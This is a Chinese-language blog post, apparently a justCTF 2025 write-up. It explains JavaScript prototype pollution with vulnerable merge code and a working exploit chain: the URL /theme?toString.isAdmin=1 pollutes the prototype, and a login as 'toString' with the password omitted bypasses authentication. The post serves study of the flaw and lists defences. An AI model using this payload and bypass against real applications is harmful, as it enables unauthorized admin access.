<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="xrivendell7">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-justCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/08/10/justCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-08-10T10:20:25.000Z" itemprop="datePublished">2025-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/08/10/justCTF2025/">justCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="justCTF-2025"><a href="#justCTF-2025" class="headerlink" title="justCTF 2025"></a>justCTF 2025</h2><h3 id="positive-player"><a href="#positive-player" class="headerlink" title="positive_player"></a>positive_player</h3><h4 id="前置知识–JS原型链污染"><a href="#前置知识–JS原型链污染" class="headerlink" title="前置知识–JS原型链污染"></a>前置知识–JS原型链污染</h4><h5 id="原型链概念"><a href="#原型链概念" class="headerlink" title="原型链概念"></a>原型链概念</h5><p>JavaScript 的每个对象拥有一个原型对象，以该原型为模板、继承方法和属性；原型对象也可能拥有原型，并从中继承方法和属性，以此类推。这种关系常被称为<strong>原型链</strong> (prototype chain)。</p>
<p>任何对象的祖先原型都是 <code>object.prototype</code>。</p>
<h6 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h6><p><strong>一、<em>proto</em>_ 属性</strong></p>
<p>每个对象实例都有的一个内部属性，指向该对象的“原型对象”，即该对象从哪里继承属性和方法</p>
<p>可通过 <code>__proto__</code> 访问其原型对象</p>
<p><strong>二、prototype 属性</strong></p>
<p>函数（包括构造函数）的一个属性</p>
<p>本质上是一个模板对象，新实例会继承它上面的属性和方法</p>
<p><strong>三、constructor 属性</strong></p>
<p>默认存在于函数的 <code>prototype</code> 对象上。</p>
<p>指向创建该 <code>prototype</code> 对象的构造函数本身。如 <code>A.prototype.constructor</code> 默认指向 <code>A</code>。</p>
<h6 id="重要关系"><a href="#重要关系" class="headerlink" title="重要关系"></a>重要关系</h6><p>任意对象可通过属性 <code>__proto__</code> 访问其原型对象，即 <code>obj.__proto__ == Object.prototype</code></p>
<p>实例对象可以通过原型链访问到 <code>constructor</code> 属性，即：<code>obj.constructor.prototype</code> &#x3D;&#x3D;&#x3D; <code>Object.prototype</code>。比如：</p>
<h5 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h5><p>JavaScript类的所有属性都允许被公开的访问和修改，包括属性 <code>__proto__</code> ，<code>constructor</code>和<code>prototype</code>。</p>
<p>原型污染指的是攻击者能够修改应用程序或库使用的对象原型（通常是 <code>Object.prototype</code>）的属性，且被所有经过该原型链的对象所继承，从而导致不可预期的行为，如拒绝服务攻击（通过触发JavaScript异常）或者远程代码执行等。</p>
<p>原型链污染目的是在<code>Object.prototype</code>上造成污染，主要有两种场景：</p>
<p>​	不安全的对象递归合并</p>
<p>​	按路径定义属性</p>
<h6 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h6><p>递归合并函数<code>merge()</code>的基本逻辑和代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 符合模式一：obj[a][b] = value</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若 <code>source</code> 包含<strong>可枚举</strong>属性 <code>__proto__</code>， 则可以新增&#x2F;修改 <code>tagret[__proto__]</code> 属性</p>
<p>以下代码存在原型链污染漏洞：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title function_">merge</span>(obj, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">// 此时 obj.__proto__.isAdmin = true</span></span><br><span class="line"><span class="comment">// 而 obj.__proto__ 就是 Object.prototype（因为 obj 是 &#123;&#125;）</span></span><br><span class="line"><span class="comment">// 所以 Object.prototype.isAdmin = true</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">isAdmin</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>即使 <code>user</code> 是新对象，也“自动”获得了 <code>isAdmin: true</code>。</p>
<h6 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h6><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。如以下的函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将对象object的指定路径path的属性值修改为value</span></span><br><span class="line"><span class="title function_">theFunction</span>(object, path, value)</span><br></pre></td></tr></table></figure>

<p>如果攻击者可以控制路径<code>path</code>的值，那么将路径设置为<code>_proto_.value</code>，运行theFunction函数后就有可能将<code>value</code>属性注入到object的原型中</p>
<p>如joint.js中的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setByPath = <span class="keyword">function</span>(<span class="params">obj, path, value, delimiter</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(path) ? path : path.<span class="title function_">split</span>(delimiter || <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> last = keys.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> diver = obj;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; last; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> key = keys[i];</span><br><span class="line">        <span class="keyword">const</span> value = diver[key];</span><br><span class="line">        <span class="comment">// diver creates an empty object if there is no nested object under such a key.</span></span><br><span class="line">        <span class="comment">// This means that one can populate an empty nested object with setByPath().</span></span><br><span class="line">        diver = value || (diver[key] = &#123;&#125;); <span class="comment">//自动创建中间层级：如果路径中的某层不存在，自动创建为&#123;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    diver[keys[last]] = value;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>setByPath</code>函数在对象 <code>obj</code> 中，将 <code>path</code> 路径对应的属性设置为 <code>value</code></p>
<p>输入以下的路径，那就会造成原型污染：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jointjs = <span class="built_in">require</span>(<span class="string">&quot;jointjs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + obj.<span class="property">polluted</span>);</span><br><span class="line">jointjs.<span class="property">util</span>.<span class="title function_">setByPath</span>(&#123; &#125;, <span class="string">&#x27;__proto__/polluted&#x27;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + obj.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>假设后端检查权限，通过污染让所有对象都有 <code>isAdmin: true</code> → 直接获得管理员权限</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user.<span class="property">isAdmin</span>) <span class="title function_">grantAdminAccess</span>();</span><br></pre></td></tr></table></figure>

<h6 id="绕过属性检查"><a href="#绕过属性检查" class="headerlink" title="绕过属性检查"></a>绕过属性检查</h6><p>如果污染了 <code>Object.prototype.hasOwnProperty</code>，就可以绕过检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">    <span class="comment">// 以为安全</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h6><p>通常发生在代码程序执行了对象上的一个特殊属性。如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(someobject.<span class="property">someattr</span>)</span><br></pre></td></tr></table></figure>

<p>在这种情况下，如果攻击者污染了 <code>Object.prototype.someattr</code> ，那么就可能导致远程代码执行。</p>
<h6 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h6><p>通常发生在 <code>Object</code> 对象持有的一些方法被隐式调用（如<code>toString</code> 和 <code>valueOf</code>）。</p>
<p>攻击者可以污染 <code>Object.prototype.someattr</code> 并改变为一个程序非预期的值，如<code>Int</code> 或 <code>Object</code>，可能导致程序无法正常工作，从而造成DoS。</p>
<h5 id="原型污染防范"><a href="#原型污染防范" class="headerlink" title="原型污染防范"></a>原型污染防范</h5><ol>
<li><p>过滤关键字： <code>__proto__</code> 、 <code>prototype</code>和 <code>constructor</code> 属性</p>
</li>
<li><p>避免使用不规范的递归。即使使用也要严格检查<code>key</code>，不能是<code>__proto__</code>和<code>constructor</code>。</p>
</li>
<li><p>考虑使用不带原型的对象，从而打断原型链。如<code>Object.create(null)</code>。</p>
</li>
<li><p>使用<code>Map</code>替换<code>Object</code>。</p>
</li>
</ol>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>由 Gemini 生成的 Express 应用，包括用户注册、登录功能和自定义主题等功能。</p>
<p>注册用户 user1&#x2F;123 ，登录之后可看到的页面如右图</p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><strong>一、定位关键字 <code>flag</code></strong></p>
<p>分析源码，搜索关键字 <code>flag</code> ，发现如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>代码逻辑如下：</p>
<p>1）用户访问 &#x2F;flag 页面时触发该处理器</p>
<p>2）首先验证用户是否成功登录</p>
<p>3）若成功登录，判断是否具备管理员权限；若具备则返回FLAG，反之返回 Not admin</p>
<p>结合上述分析，需要一个具备管理员权限的用户，登录成功后访问 &#x2F;flag 路径即可获得FLAG。</p>
<p><strong>二、定位危险函数 <code>deepMerge</code></strong> </p>
<p>分析源码发现，定义了递归合并函数 <code>deepMerge</code> ，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. A function to recursively merge objects</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">deepMerge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="title class_">Object</span> &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(source[key], <span class="title function_">deepMerge</span>(target[key], source[key]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">assign</span>(target || &#123;&#125;, source);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>函数作用是将 <code>source</code> 对象的所有可枚举属性地复制到 <code>target</code>（有可能为{}）上。</p>
<p>存在递归合并函数时，考虑原型链污染漏洞。</p>
<p><strong>三、分析原型链污染的可能性</strong></p>
<p>查找函数调用链，发现 <code>app.get(&#39;theme&#39;,....)</code> 调用 <code>deepMerge</code> ，部分代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/theme` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/theme&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// 解析请求参数，过滤关键字 __proto__，prototype，constructor等</span></span><br><span class="line">  <span class="keyword">const</span> parsedUpdates = <span class="title function_">parseQueryParams</span>(queryString);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(parsedUpdates).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用deepMerge</span></span><br><span class="line">    user.<span class="property">themeConfig</span> = <span class="title function_">deepMerge</span>(user.<span class="property">themeConfig</span>, parsedUpdates);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是在调用 <code>parseQueryParams</code> 函数之前，先调用<code>parseQueryParams</code>函数解析请求参数，过滤了 <code>[&#39;__proto__&#39;, &#39;prototype&#39;, &#39;constructor&#39;]</code> 等关键字。代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. A function to parse a query string with dot-notation keys.</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">parseQueryParams</span> = (<span class="params">queryString</span>) =&gt; &#123;</span><br><span class="line">  .....</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="keyword">const</span> path = key.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    .....</span><br><span class="line">      <span class="comment">// 过滤关键字</span></span><br><span class="line">      <span class="keyword">if</span>([<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">includes</span>(part))&#123;</span><br><span class="line">        part = <span class="string">&#x27;__unsafe$&#x27;</span> + part;</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>故直接污染 <code>object.prototype.isAdmin</code>的思路行不通</p>
<p><strong>四、原型链污染扩展</strong></p>
<p>再次查看获取 <code>flag</code> 的相关代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 关键判断</span></span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>关键代码是 <code>users[req.session.userId].isAdmin == true</code> ，其中：</p>
<p>​	<code>req.session.userId</code> 在用户登录认证通过后赋值为 <code>username</code> </p>
<p>​	<code>users</code> 初始化为 {} ，在用户注册成功后存入数据 <code>&#123; username: &#123; password, userThemeConfig, isAdmin &#125; &#125;</code></p>
<p>可知<code>users.__proto__</code> 就是 <code>Object.prototype</code> ，如下：</p>
<style>.tiqbytvzxmpp{zoom: 67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812193235289-1762219779844-12.png" class="tiqbytvzxmpp" alt="image-20250812193235289-1762219779844-12">

<p>故<code>users</code> 除了自身的属性：<code>user1</code> 之外；还有继承自原型（即 <code>Object</code>）的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等</p>
<p><code>users[req.session.userId]</code> 本质上是获取users的一个属性，所以 <code>req.session.userId</code> 不一定是合法的用户名（如 <code>user1</code>），也可以是 <code>users</code> 的其它属性（如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等），只要保证<code>users[某属性]</code> 返回非空的结果即可</p>
<p>然后确保 <code>users[某属性]</code> 的<code>.isAdmin</code> 值为 1，就可以使得 <code>if</code> 条件判断为真，进获取 <code>FLAG</code> 。</p>
<p>综上所述，攻击思路如下：</p>
<p>​	1）通过原型链污染原型Object的属性（如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toString</code> 等），在该受污染属性上添加 <code>isAdmin</code> 、并将值设置为1 。</p>
<p>​	2）尝试以该属性名称为 <code>username</code> 注册&#x2F;登录系统，则 <code>users[受污染属性].isAdmin</code>  值为1 ，然后访问 <code>/flag</code> 即可获取FLAG。</p>
<p>第1步前面已讨论过，存在递归合并函数 <code>deepMerge</code> ，可以实现原型链污染。下面讨论第2步如何实现以特殊用户（属性名称）登录系统</p>
<p><strong>五、登录认证绕过</strong></p>
<p>尝试以原型Object的属性名称注册&#x2F;登录用户，以 <code>toString</code> 为例（使用其它继承自<code>Object</code>的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toLocalString</code> 等都可以）。</p>
<p>理想情况是先注册、再登录。但是在注册时提示用户已经存在：</p>
<style>.tsnnfpedxste{zoom: 50%;}</style><img src="/2025/08/10/justCTF2025/image-20250812201006695.png" class="tsnnfpedxste" alt="image-20250812201006695">

<p>查看注册相关的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="comment">// 判断用户名是否存在</span></span><br><span class="line">  <span class="keyword">if</span> (users[username]) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">errorMessage</span> = <span class="string">&#x27;User already exists!&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>如前所述，<code>users</code> 的原型为 <code>Object</code> 。当 <code>username</code> 为 <code>toString</code>时，因为<code>users</code>自身不包含 <code>toString</code> 属性，故<code>users[username]</code> 返回的是<code>users.__proto__.toString</code> 即<code>Object.toString</code> 方法。如下：</p>
<style>.rxaoysymxgtw{zoom:67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812201644955.png" class="rxaoysymxgtw" alt="image-20250812201644955">

<p><code>users[username]</code>非空，返回用户已存在，所以没有办法再次注册。</p>
<p>尝试 <code>toString/123</code> 直接登录，调试发现执行到304行验证用户名和密码时，关键变量的值如下：</p>
<style>.kqsmgoafzbrs{zoom:50%;}</style><img src="/2025/08/10/justCTF2025/image-20250812202547181-1762342243354-5.png" class="kqsmgoafzbrs" alt="image-20250812202547181">

<p>​	<code>user</code> 值为 <code>Object.toString()</code> 方法，非空；</p>
<p>​	<code>user.password</code> &#x3D;&#x3D; <code>toString().password</code> &#x3D;&#x3D; <code>undefined</code></p>
<p>故要想通过304行的检查，将变量 <code>password</code> 的值设置为 <code>undefined</code> 即可。这样就可以绕过认证，以用户名 <code>toString</code> 成功登录系统。</p>
<p><strong>六、攻击步骤</strong></p>
<p>结合以上分析，可执行的攻击步骤如下：</p>
<ol>
<li>污染原型属性 <code>Object.toString</code></li>
</ol>
<p>原型链污染发生的函数为 <code>deepMerge</code>，其调用链为：</p>
<p>​	 <code>app.get(&#39;/theme&#39;,isAuthenticated,...)</code>  –&gt;  <code>parseQueryParams</code>  –&gt;  <code>deepMerge</code> </p>
<p>访问 &#x2F;theme 时需要用户已经登录，故先注册、登录普通用户 <code>user1</code> ，然后通过传递 <code>toString.isAdmin=1</code> 的查询参数，污染 <code>Object.prototype.toString</code>，在<code>toString</code>上添加 <code>isAdmin</code>、并将值置为 1 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 原型污染 url</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.148</span>:<span class="number">3000</span>/theme?toString.isAdmin=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>访问过程中<code>parseQueryParams</code> 函数会生成对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">toString</span>: &#123; <span class="attr">isAdmin</span>: <span class="string">&quot;1&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>随后调用 <code>deepMerge</code> 函数合并对象时，会将 <code>&#123; isAdmin: &quot;1&quot; &#125;</code> 合并到 <code>Object.prototype.toString</code> 上，导致所有对象的 <code>toString.isAdmin</code> 被污染。下图是污染前后 的<code>toString</code> ，可以看到污染后的 <code>toString</code> 多了 <code>isAdmin</code> 属性，且值为1：</p>
<style>.jqtoymtdeshp{zoom:67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812205418685.png" class="jqtoymtdeshp" alt="image-20250812205418685">



<ol start="2">
<li>登录为 <code>toString</code> 用户</li>
</ol>
<p>污染成功后，使用 <code>toString</code>用户名登录，<code>password</code>处随便填写，使用bp抓包后删除<code>password</code>字段后发送</p>
<p>页面跳转后说明登录成功，然后访问 &#x2F;flag 成功</p>
<p><img src="/gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA.png" alt="gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA"></p>
<h4 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h4><h5 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h5><ol>
<li>JS原型链污染漏洞利用及扩展</li>
<li>登录认证函数逻辑漏洞的识别与利用</li>
</ol>
<h5 id="关键技巧"><a href="#关键技巧" class="headerlink" title="关键技巧"></a>关键技巧</h5><ol>
<li><strong>原型污染扩展</strong>：</li>
</ol>
<p>​	利用原生属性（如 <code>toString</code>）绕过对 <code>__proto__</code> 的过滤。</p>
<p>​	通过 <code>deepMerge</code> 将污染扩散到原型链。</p>
<ol start="2">
<li><strong>认证函数逻辑漏洞</strong>：</li>
</ol>
<p>​	利用 <code>users</code> 对象继承 <code>Object.prototype</code> 的特性，使 <code>toString</code> 成为“已存在用户”。</p>
<p>​	通过 <code>undefined === undefined</code> 绕过密码检查。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq">https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq</a></p>

      
    </div>
    <footer class="article-footer">
